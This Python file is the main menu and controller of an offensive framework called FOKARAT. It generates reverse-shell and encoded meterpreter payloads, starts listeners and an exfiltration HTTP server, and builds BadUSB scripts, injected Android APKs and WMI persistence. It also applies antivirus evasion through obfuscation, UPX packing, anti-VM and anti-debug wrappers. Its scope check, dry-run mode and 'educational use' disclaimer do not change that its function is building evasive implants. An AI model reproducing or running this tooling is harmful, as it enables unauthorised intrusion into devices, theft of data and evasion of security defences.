#!/usr/bin/env python3
"""
FOKARAT v3.1 - Framework de cybersécurité
Interface animée + Éthique + Scope + Audit
Auteur: Lwano Amissi Blanchard (FOKAS)
"""
import os
import sys
import time
import json

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

# ─── CORE ────────────────────────────────────────
from core.config import Config
from core.logger import Logger
from core.utils import which
from core.database import Database
from core.scope import ScopeValidator
from core.ethics import EthicsController

# ─── MODULES PAYLOADS ────────────────────────────
from modules.payload_generators.python_gen import PythonPayloadGenerator
from modules.payload_generators.cpp_gen import CppPayloadGenerator
from modules.payload_generators.msfvenom_gen import MsfvenomGenerator

# ─── MODULES LISTENERS ───────────────────────────
from modules.listeners.listener_manager import ListenerManager

# ─── MODULES INJECTORS ───────────────────────────
from modules.injectors.badusb_gen import BadUSBGenerator
from modules.injectors.duck_encoder import DuckEncoder
from modules.injectors.usb_flasher import USBFlasher
from modules.injectors.http_server import HTTPServer

# ─── MODULES ATTAQUES ────────────────────────────
from modules.android.apk_injector import ApkInjector
from modules.persistence.wmi_persist import WMIPersistence

# ─── MODULES ÉVASION ─────────────────────────────
from modules.evasion.payload_padding import PaddingGenerator
from modules.evasion.python_obfuscator import PythonObfuscator
from modules.evasion.upx_packer import UPXPacker
from modules.evasion.multi_encoder import MultiEncoder
from modules.evasion.anti_vm import AntiVMGenerator
from modules.evasion.anti_debug import AntiDebugGenerator

# ─── IA ──────────────────────────────────────────
from ai.assistant import Assistant


# ══════════════════════════════════════════════════
#  INITIALISATION
# ══════════════════════════════════════════════════
logger = Logger()
config = Config()
listener = ListenerManager()
http_server = HTTPServer()
db = Database()
scope_validator = ScopeValidator()
ethics = EthicsController()


# ══════════════════════════════════════════════════
#  COULEURS ANSI
# ══════════════════════════════════════════════════
class C:
    R = "\033[0m"
    B = "\033[1m"
    D = "\033[2m"
    RED = "\033[91m"
    GRN = "\033[92m"
    YEL = "\033[93m"
    BLU = "\033[94m"
    MAG = "\033[95m"
    CYN = "\033[96m"
    WHT = "\033[97m"
    OR = "\033[38;5;208m"
    PNK = "\033[38;5;213m"


# ══════════════════════════════════════════════════
#  BANNIÈRE ASCII
# ══════════════════════════════════════════════════
BANNER = f"""{C.GRN}{C.B}
   ███████╗ ██████╗ ██╗  ██╗ █████╗ ██████╗  █████╗ ████████╗
   ██╔════╝██╔═══██╗██║ ██╔╝██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝
   █████╗  ██║   ██║█████╔╝ ███████║██████╔╝███████║   ██║
   ██╔══╝  ██║   ██║██╔═██╗ ██╔══██║██╔══██╗██╔══██║   ██║
   ██║     ╚██████╔╝██║  ██╗██║  ██║██║  ██║██║  ██║   ██║
   ╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   {C.R}
{C.CYN}{C.B}              Building the future, one tool at a time.{C.R}
{C.YEL}                    FOKARAT Framework v3.1{C.R}
"""


BOOT_SEQUENCE = [
    ("[BOOT 01] Initialisation du noyau FOKARAT...", 0.10),
    ("[BOOT 02] Chargement des modules payloads...", 0.10),
    ("[BOOT 03] Chargement des listeners...", 0.10),
    ("[BOOT 04] Chargement des modules Android...", 0.10),
    ("[BOOT 05] Chargement des modules d'évasion...", 0.10),
    ("[BOOT 06] Initialisation de la base de données...", 0.10),
    ("[BOOT 07] Chargement du contrôleur éthique...", 0.10),
    ("[BOOT 08] Validation du scope en cours...", 0.10),
    ("[BOOT 09] Chargement de l'assistant IA...", 0.10),
    ("[BOOT 10] Vérification des dépendances...", 0.15),
    ("[BOOT 11] Système prêt pour la session.", 0.25),
]


# ══════════════════════════════════════════════════
#  FONCTIONS D'ANIMATION
# ══════════════════════════════════════════════════
def clear():
    os.system("cls" if os.name == "nt" else "clear")


def typewriter(text, delay=0.008, color=C.WHT):
    for char in text:
        sys.stdout.write(f"{color}{char}{C.R}")
        sys.stdout.flush()
        time.sleep(delay)
    print()


def spinner(duration=0.6, message="Chargement", color=C.CYN):
    frames = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
    end = time.time() + duration
    i = 0
    while time.time() < end:
        sys.stdout.write(f"\r  {color}{frames[i % len(frames)]}{C.R} {message}...")
        sys.stdout.flush()
        time.sleep(0.06)
        i += 1
    sys.stdout.write("\r" + " " * (len(message) + 15) + "\r")


def progress_bar(duration=0.8, width=40, color=C.GRN):
    sys.stdout.write("  ")
    for i in range(width + 1):
        pct = int(i / width * 100)
        filled = "█" * i
        empty = "░" * (width - i)
        sys.stdout.write(f"\r  {color}{filled}{C.D}{empty}{C.R} {C.B}{pct:3d}%{C.R}")
        sys.stdout.flush()
        time.sleep(duration / width)
    print()


def boot_animation():
    clear()
    print()
    for msg, delay in BOOT_SEQUENCE:
        typewriter(f"  {C.YEL}{msg}{C.R}", delay=0.003)
        time.sleep(delay)
    print()
    progress_bar(0.6, 50, C.CYN)
    time.sleep(0.2)


def animated_banner():
    clear()
    print()
    for line in BANNER.split("\n"):
        print(f"  {line}")
        time.sleep(0.02)
    print()


def separator(char="═", length=62, color=C.CYN):
    return f"{color}{char * length}{C.R}"


def menu_option(key, label, color=C.WHT):
    return f"  {C.YEL}│{C.R}  {C.GRN}[{key}]{C.R}  {color}{label}{C.R}"


# ══════════════════════════════════════════════════
#  MENU PRINCIPAL
# ══════════════════════════════════════════════════
def show_menu():
    clear()
    animated_banner()

    lhost = config.get("lhost") or f"{C.RED}(non défini){C.R}"
    lport = config.get("lport")
    out = config.get("output_dir", "output")

    # Statut scope et dry-run
    scope_status = f"{C.GRN}✓ actif{C.R}" if scope_validator.active_scope else f"{C.RED}✗ inactif{C.R}"
    dry_run_status = f"{C.YEL}ON{C.R}" if ethics.dry_run else f"{C.D}OFF{C.R}"

    print(f"  {C.MAG}◆{C.R} LHOST : {C.CYN}{lhost}{C.R}       "
          f"{C.MAG}◆{C.R} LPORT : {C.CYN}{lport}{C.R}       "
          f"{C.MAG}◆{C.R} Output : {C.CYN}{out}{C.R}")
    print(f"  {C.MAG}◆{C.R} Scope : {scope_status}       "
          f"{C.MAG}◆{C.R} DRY-RUN : {dry_run_status}")
    print()

    print(separator("═", 62, C.CYN))

    # ─── PAYLOADS ──────────────────────────────
    print(f"  {C.B}{C.MAG}▶ PAYLOADS{C.R}")
    print(menu_option("01", "Payload Python (reverse shell)"))
    print(menu_option("02", "Payload C++ (Mingw)"))
    print(menu_option("03", "Payload MSFVenom"))

    print(separator("─", 62, C.BLU))

    # ─── LISTENERS ─────────────────────────────
    print(f"  {C.B}{C.MAG}▶ LISTENERS{C.R}")
    print(menu_option("04", "Listener ncat"))
    print(menu_option("05", "Listener Metasploit"))
    print(menu_option("06", "Arrêter tous les listeners", C.RED))
    print(menu_option("07", "Serveur HTTP (payloads / exfil)"))

    print(separator("─", 62, C.BLU))

    # ─── BADUSB ────────────────────────────────
    print(f"  {C.B}{C.MAG}▶ BADUSB{C.R}")
    print(menu_option("08", "Générer DuckyScript (5 types d'attaques)"))
    print(menu_option("09", "Encoder .duck → .bin"))
    print(menu_option("10", "Flasher sur matériel USB"))

    print(separator("─", 62, C.BLU))

    # ─── ATTAQUES ──────────────────────────────
    print(f"  {C.B}{C.MAG}▶ ATTAQUES{C.R}")
    print(menu_option("11", "APK Injector (Android)"))
    print(menu_option("12", "Persistance WMI (Windows)"))

    print(separator("─", 62, C.BLU))

    # ─── ÉVASION ANTIVIRUS ─────────────────────
    print(f"  {C.B}{C.RED}▶ ÉVASION ANTIVIRUS{C.R}")
    print(menu_option("20", "Appliquer padding aléatoire (C++)"))
    print(menu_option("21", "Obfusquer payload Python"))
    print(menu_option("22", "Compresser binaire avec UPX"))
    print(menu_option("23", "Multi-encodage MSFVenom"))
    print(menu_option("24", "Ajouter protection Anti-VM"))
    print(menu_option("25", "Ajouter protection Anti-Debug"))

    print(separator("─", 62, C.BLU))

    # ─── ÉTHIQUE & LÉGAL ───────────────────────
    print(f"  {C.B}{C.RED}▶ ÉTHIQUE & LÉGAL{C.R}")
    print(menu_option("30", "Déclarer un scope (autorisation obligatoire)"))
    print(menu_option("31", "Activer / Désactiver le mode DRY-RUN"))
    print(menu_option("32", "Voir le journal d'audit"))

    print(separator("─", 62, C.BLU))

    # ─── DIVERS ────────────────────────────────
    print(f"  {C.B}{C.MAG}▶ DIVERS{C.R}")
    print(menu_option("13", "Assistant IA local"))
    print(menu_option("14", "Configuration LHOST / LPORT"))
    print(menu_option("15", "Sauvegarder la config"))
    print(menu_option("16", "Ouvrir msfconsole"))
    print(menu_option("17", "Vérifier les dépendances"))
    print(menu_option("26", "Voir le rapport d'opérations"))
    print(menu_option("27", "Lancer l'API Web (port 5000)"))
    print(menu_option("18", "Crédits"))
    print(menu_option("19", "Quitter", C.RED))

    print(separator("═", 62, C.CYN))
    print()


# ══════════════════════════════════════════════════
#  VÉRIFICATION DES DÉPENDANCES
# ══════════════════════════════════════════════════
def check_dependencies():
    clear()
    animated_banner()
    print(f"  {C.B}{C.CYN}═══ VÉRIFICATION DES DÉPENDANCES ═══{C.R}\n")

    deps = {
        "python3": "Interpréteur Python",
        "pip": "Gestionnaire Python",
        "git": "Contrôle de version",
        "g++": "Compilateur C++",
        "x86_64-w64-mingw32-g++": "Compilateur Mingw64",
        "msfvenom": "Générateur Metasploit",
        "msfconsole": "Console Metasploit",
        "ncat": "Netcat moderne",
        "apktool": "Décompilation APK",
        "jarsigner": "Signature Java",
        "zipalign": "Alignement APK",
        "keytool": "Gestion keystore",
        "java": "Java Runtime",
        "upx": "Compression UPX",
        "pyinstaller": "Compil Python → exe",
    }

    missing = []
    for cmd, desc in deps.items():
        spinner(0.10, f"Vérification de {cmd}")
        if which(cmd):
            print(f"  {C.GRN}[✓]{C.R} {C.B}{cmd:<28}{C.R} {C.D}{desc}{C.R}")
        else:
            print(f"  {C.RED}[✗]{C.R} {C.B}{cmd:<28}{C.R} {C.D}{desc}{C.R}")
            missing.append(cmd)

    print()
    if missing:
        logger.warning(f"{len(missing)} outil(s) manquant(s).")
        print(f"\n  {C.YEL}Installation :{C.R}")
        print(f"    {C.CYN}sudo apt install python3 python3-pip git g++ mingw-w64 ncat \\")
        print(f"        apktool default-jdk zipalign binutils-avr upx-ucl{C.R}")
        print(f"    {C.CYN}pip install pyinstaller llama-cpp-python fastapi uvicorn{C.R}")
    else:
        logger.success("Toutes les dépendances sont présentes !")
    input(f"\n  {C.D}[Entrée] pour continuer...{C.R}")


# ══════════════════════════════════════════════════
#  GESTIONNAIRES DES MODULES D'ÉVASION
# ══════════════════════════════════════════════════
def handle_padding():
    path = input(f"  {C.YEL}Chemin du fichier .c à protéger :{C.R} ").strip()
    if not path or not os.path.exists(path):
        logger.error("Fichier introuvable.")
        return
    with open(path, "r", encoding="utf-8") as f:
        code = f.read()
    gen = PaddingGenerator()
    wrapped = gen.wrap_payload(code, size_kb=8, fake_funcs=15)
    out = path.replace(".c", "_protected.c")
    with open(out, "w", encoding="utf-8") as f:
        f.write(wrapped)
    logger.success(f"Payload protégé : {out}")
    db.log_payload("padding_cpp", "-", 0, out, "success")
    ethics.audit("PADDING_APPLIED", out)


def handle_python_obfuscation():
    path = input(f"  {C.YEL}Chemin du fichier .py à obfusquer :{C.R} ").strip()
    if not path or not os.path.exists(path):
        logger.error("Fichier introuvable.")
        return
    with open(path, "r", encoding="utf-8") as f:
        code = f.read()
    obs = PythonObfuscator().obfuscate(code)
    out = path.replace(".py", "_obf.py")
    with open(out, "w", encoding="utf-8") as f:
        f.write(obs)
    logger.success(f"Payload obfusqué : {out}")
    db.log_payload("obfuscated_python", "-", 0, out, "success")
    ethics.audit("PYTHON_OBFUSCATED", out)


def handle_upx():
    path = input(f"  {C.YEL}Chemin du binaire à compresser :{C.R} ").strip()
    if not path or not os.path.exists(path):
        logger.error("Binaire introuvable.")
        return
    packer = UPXPacker()
    result = packer.pack(path, ultra=True)
    db.log_payload("upx_packed", "-", 0, result, "success")
    ethics.audit("UPX_PACKED", result)


def handle_multi_encoder():
    enc = MultiEncoder()
    enc.list_encoders()
    key = input(f"  {C.YEL}Choix de l'encodeur [1] :{C.R} ").strip() or "1"

    lhost = input(f"  {C.YEL}LHOST :{C.R} ").strip()
    if not lhost:
        logger.error("LHOST obligatoire.")
        return
    try:
        lport = int(input(f"  {C.YEL}LPORT :{C.R} ").strip())
    except ValueError:
        logger.error("LPORT invalide.")
        return

    try:
        iters = int(input(f"  {C.YEL}Itérations [5] :{C.R} ").strip() or "5")
    except ValueError:
        iters = 5

    out_dir = config.get("output_dir", "output")
    os.makedirs(out_dir, exist_ok=True)
    out = os.path.join(out_dir, f"payload_encoded_{key}.exe")

    result = enc.encode(
        "windows/meterpreter/reverse_tcp",
        lhost, lport, out, key, iterations=iters
    )
    if result:
        db.log_payload("multi_encoded", lhost, lport, result, "success")
        ethics.audit("MULTI_ENCODED", result)


def handle_anti_vm():
    path = input(f"  {C.YEL}Chemin du .c :{C.R} ").strip()
    if not path or not os.path.exists(path):
        logger.error("Fichier introuvable.")
        return
    with open(path, "r", encoding="utf-8") as f:
        code = f.read()
    wrapped = AntiVMGenerator().wrap_with_anti_vm(code)
    out = path.replace(".c", "_antivm.c")
    with open(out, "w", encoding="utf-8") as f:
        f.write(wrapped)
    logger.success(f"Protection Anti-VM ajoutée : {out}")
    ethics.audit("ANTI_VM_APPLIED", out)


def handle_anti_debug():
    path = input(f"  {C.YEL}Chemin du .c :{C.R} ").strip()
    if not path or not os.path.exists(path):
        logger.error("Fichier introuvable.")
        return
    with open(path, "r", encoding="utf-8") as f:
        code = f.read()
    wrapped = AntiDebugGenerator().wrap(code)
    out = path.replace(".c", "_antidbg.c")
    with open(out, "w", encoding="utf-8") as f:
        f.write(wrapped)
    logger.success(f"Protection Anti-Debug ajoutée : {out}")
    ethics.audit("ANTI_DEBUG_APPLIED", out)


def handle_report():
    path = db.export_report()
    print(f"\n  {C.GRN}Rapport généré : {path}{C.R}\n")
    try:
        with open(path, "r", encoding="utf-8") as f:
            print(f.read())
    except Exception as e:
        logger.error(f"Lecture impossible : {e}")
    ethics.audit("REPORT_GENERATED", path)


def handle_web_api():
    logger.info("Démarrage de l'API Web sur le port 5000...")
    logger.info("Ouvrez : http://localhost:5000/docs")
    ethics.audit("WEB_API_STARTED", "port 5000")
    try:
        from web.api import start_web
        start_web()
    except ImportError as e:
        logger.error(f"FastAPI/Uvicorn non installé : {e}")
        logger.info("pip install fastapi uvicorn")


# ══════════════════════════════════════════════════
#  GESTIONNAIRES ÉTHIQUE & LÉGAL
# ══════════════════════════════════════════════════
def handle_scope():
    clear()
    print(f"\n  {C.B}{C.CYN}═══ DÉCLARATION DE SCOPE ═══{C.R}\n")

    # Vérifier si un scope est déjà actif
    existing = scope_validator.load_scope()
    if existing:
        print(f"  {C.YEL}Scope actif :{C.R}")
        print(f"    Cible      : {C.CYN}{existing['target']}{C.R}")
        print(f"    Autorisation : {C.CYN}{existing['auth_ref']}{C.R}")
        print(f"    Expire le  : {C.CYN}{existing['expires_at'][:19]}{C.R}\n")

        choice = input(f"  {C.YEL}Remplacer ? (o/n) [n] :{C.R} ").strip().lower()
        if choice != "o":
            return

    scope_validator.require_scope()


def handle_dry_run():
    if ethics.dry_run:
        ethics.disable_dry_run()
        logger.info("Mode DRY-RUN désactivé : les actions seront réelles.")
    else:
        ethics.enable_dry_run()
        logger.warning("Mode DRY-RUN activé : les actions seront simulées.")


def handle_audit_log():
    clear()
    print(f"\n  {C.B}{C.CYN}═══ JOURNAL D'AUDIT ═══{C.R}\n")

    audit_file = "output/audit.log"
    if not os.path.exists(audit_file):
        logger.info("Aucun log d'audit pour le moment.")
        return

    try:
        with open(audit_file, "r", encoding="utf-8") as f:
            lines = f.readlines()

        print(f"  {C.D}{len(lines)} entrée(s) au total{C.R}\n")
        print(f"  {'Timestamp':<22} {'Action':<22} {'Détails':<30}")
        print(f"  {'-' * 22} {'-' * 22} {'-' * 30}")

        for line in lines[-30:]:  # Derniers 30
            try:
                entry = json.loads(line)
                ts = entry.get("timestamp", "")[:19]
                action = entry.get("action", "")
                details = entry.get("details", "")[:30]
                dry = f"{C.YEL}[DRY]{C.R}" if entry.get("dry_run") else "     "
                print(f"  {C.D}{ts:<22}{C.R} {dry}{action:<20} {C.D}{details}{C.R}")
            except Exception:
                pass

        if len(lines) > 30:
            print(f"\n  {C.D}... et {len(lines) - 30} autre(s) entrée(s){C.R}")

    except Exception as e:
        logger.error(f"Lecture impossible : {e}")


# ══════════════════════════════════════════════════
#  BOUCLE PRINCIPALE
# ══════════════════════════════════════════════════
def main():
    boot_animation()
    time.sleep(0.3)

    # Charge le scope existant s'il y en a un
    scope_validator.load_scope()

    while True:
        show_menu()
        choice = input(f"  {C.B}{C.MAG}╰─▶{C.R} {C.B}FOKARAT{C.R} {C.YEL}>{C.R} ").strip()

        try:
            # ─── PAYLOADS ──────────────────────
            if choice == "01":
                if not ethics.confirm_action("Génération payload Python"):
                    input(f"\n  {C.D}[Entrée] pour continuer...{C.R}")
                    continue
                spinner(0.3, "Préparation du module Python")
                result = PythonPayloadGenerator().run(config)
                if result.get("status") == "success":
                    db.log_payload("python", config.get("lhost"), config.get("lport"),
                                   result.get("payload_path"), "success")
                    ethics.audit("PAYLOAD_PYTHON", str(result.get("payload_path")))

            elif choice == "02":
                if not ethics.confirm_action("Génération payload C++"):
                    input(f"\n  {C.D}[Entrée] pour continuer...{C.R}")
                    continue
                spinner(0.3, "Préparation du module C++")
                result = CppPayloadGenerator().run(config)
                if result.get("status") == "success":
                    db.log_payload("cpp", config.get("lhost"), config.get("lport"),
                                   result.get("payload_path"), "success")
                    ethics.audit("PAYLOAD_CPP", str(result.get("payload_path")))

            elif choice == "03":
                if not ethics.confirm_action("Génération payload MSFVenom"):
                    input(f"\n  {C.D}[Entrée] pour continuer...{C.R}")
                    continue
                spinner(0.3, "Préparation de MSFVenom")
                result = MsfvenomGenerator().run(config)
                if result.get("status") == "success":
                    db.log_payload("msfvenom", config.get("lhost"), config.get("lport"),
                                   result.get("payload_path"), "success")
                    ethics.audit("PAYLOAD_MSFVENOM", str(result.get("payload_path")))

            # ─── LISTENERS ─────────────────────
            elif choice == "04":
                spinner(0.3, "Démarrage ncat")
                listener.start_ncat(config)
                db.log_listener("ncat", config.get("lhost"), config.get("lport"), "-", "running")
                ethics.audit("LISTENER_NCAT", f"{config.get('lhost')}:{config.get('lport')}")

            elif choice == "05":
                spinner(0.3, "Démarrage Metasploit")
                listener.start_msf(config)
                db.log_listener("msf", config.get("lhost"), config.get("lport"), "-", "running")
                ethics.audit("LISTENER_MSF", f"{config.get('lhost')}:{config.get('lport')}")

            elif choice == "06":
                listener.stop_all()
                ethics.audit("LISTENERS_STOPPED", "tous")

            elif choice == "07":
                http_server.run(config)
                continue

            # ─── BADUSB ────────────────────────
            elif choice == "08":
                if not ethics.confirm_action("Génération DuckyScript"):
                    input(f"\n  {C.D}[Entrée] pour continuer...{C.R}")
                    continue
                spinner(0.3, "Préparation DuckyScript")
                BadUSBGenerator().run(config)
                ethics.audit("BADUSB_GENERATED", "ducky")

            elif choice == "09":
                DuckEncoder().run(config)
                ethics.audit("DUCK_ENCODED", "bin")

            elif choice == "10":
                if not ethics.confirm_action("Flashage sur matériel USB"):
                    input(f"\n  {C.D}[Entrée] pour continuer...{C.R}")
                    continue
                USBFlasher().run(config)
                ethics.audit("USB_FLASHED", "hardware")

            # ─── ATTAQUES ──────────────────────
            elif choice == "11":
                if not ethics.confirm_action("Injection dans APK Android"):
                    input(f"\n  {C.D}[Entrée] pour continuer...{C.R}")
                    continue
                spinner(0.4, "Préparation APK Injector")
                result = ApkInjector().run(config)
                if result.get("status") == "success":
                    db.log_payload("apk_injected", result.get("lhost"),
                                   result.get("lport"), result.get("apk_path"), "success")
                    ethics.audit("APK_INJECTED", str(result.get("apk_path")))

            elif choice == "12":
                if not ethics.confirm_action("Installation persistance WMI"):
                    input(f"\n  {C.D}[Entrée] pour continuer...{C.R}")
                    continue
                WMIPersistence().run(config)
                ethics.audit("WMI_PERSISTENCE", "windows")

            # ─── DIVERS ────────────────────────
            elif choice == "13":
                q = input(f"  {C.CYN}Question >{C.R} ").strip()
                print()
                spinner(0.5, "Réflexion de l'IA")
                print(Assistant(config.get("llm_model_path")).chat(q))

            elif choice == "14":
                print()
                new_ip = input(f"  {C.YEL}Nouveau LHOST [{config.get('lhost')}]{C.R} : ").strip()
                if new_ip:
                    config.set("lhost", new_ip)
                new_port = input(f"  {C.YEL}Nouveau LPORT [{config.get('lport')}]{C.R} : ").strip()
                if new_port.isdigit():
                    config.set("lport", int(new_port))
                spinner(0.3, "Mise à jour")
                logger.success("Configuration mise à jour.")

            elif choice == "15":
                spinner(0.3, "Sauvegarde")
                if config.save():
                    logger.success("Config sauvegardée dans config.yaml")
                    ethics.audit("CONFIG_SAVED", "config.yaml")

            elif choice == "16":
                if which("msfconsole"):
                    spinner(0.4, "Ouverture de msfconsole")
                    os.system("msfconsole")
                else:
                    logger.error("msfconsole absent.")

            elif choice == "17":
                check_dependencies()
                continue

            elif choice == "18":
                clear()
                animated_banner()
                print(f"  {C.B}{C.GRN}FOKARAT v3.1{C.R}")
                print(f"  {C.WHT}Auteur  :{C.R} Lwano Amissi Blanchard (FOKAS)")
                print(f"  {C.WHT}Email   :{C.R} amissilwano5@gmail.com")
                print(f"  {C.WHT}GitHub  :{C.R} github.com/amissilwano5-beep")
                print(f"  {C.WHT}Ville   :{C.R} Bukavu, RDC")
                print()
                print(f"  {C.YEL}⚠  Usage éducatif et tests autorisés uniquement.{C.R}")

            elif choice == "19":
                print()
                spinner(0.5, "Arrêt des services")
                listener.stop_all()
                ethics.audit("FRAMEWORK_EXIT", "clean")
                typewriter(f"\n  {C.GRN}Merci d'avoir utilisé FOKARAT. À bientôt !{C.R}", delay=0.02)
                print()
                break

            # ─── ÉVASION ANTIVIRUS ─────────────
            elif choice == "20":
                handle_padding()

            elif choice == "21":
                handle_python_obfuscation()

            elif choice == "22":
                handle_upx()

            elif choice == "23":
                handle_multi_encoder()

            elif choice == "24":
                handle_anti_vm()

            elif choice == "25":
                handle_anti_debug()

            elif choice == "26":
                handle_report()

            elif choice == "27":
                handle_web_api()
                continue

            # ─── ÉTHIQUE & LÉGAL ───────────────
            elif choice == "30":
                handle_scope()

            elif choice == "31":
                handle_dry_run()

            elif choice == "32":
                handle_audit_log()

            else:
                logger.warning("Choix invalide.")

        except KeyboardInterrupt:
            print()
            logger.warning("Action interrompue.")
        except Exception as e:
            logger.error(f"Erreur : {e}")

        input(f"\n  {C.D}[Entrée] pour continuer...{C.R}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        listener.stop_all()
        print(f"\n{C.RED}[!] Sortie forcée.{C.R}")